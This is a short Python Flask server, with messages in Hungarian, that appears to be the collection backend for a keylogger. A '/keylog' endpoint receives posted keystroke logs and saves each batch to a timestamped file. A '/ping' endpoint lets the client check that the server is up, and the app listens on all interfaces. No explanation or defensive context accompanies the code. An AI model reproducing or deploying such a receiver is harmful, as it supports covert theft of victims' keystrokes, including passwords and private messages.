from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)

@app.route('/keylog', methods=['POST'])
def receive_logs():
    data = request.form.get('logs', '')
    if data:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"log_{timestamp}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"IDŐ: {datetime.now().isoformat()}\n")
            f.write("-" * 50 + "\n")
            f.write(data)
        print(f"[+] Napló mentve: {filename}")
        return "OK", 200
    return "HIBA", 400

@app.route('/ping', methods=['GET'])
def ping():
    return "Élek!", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
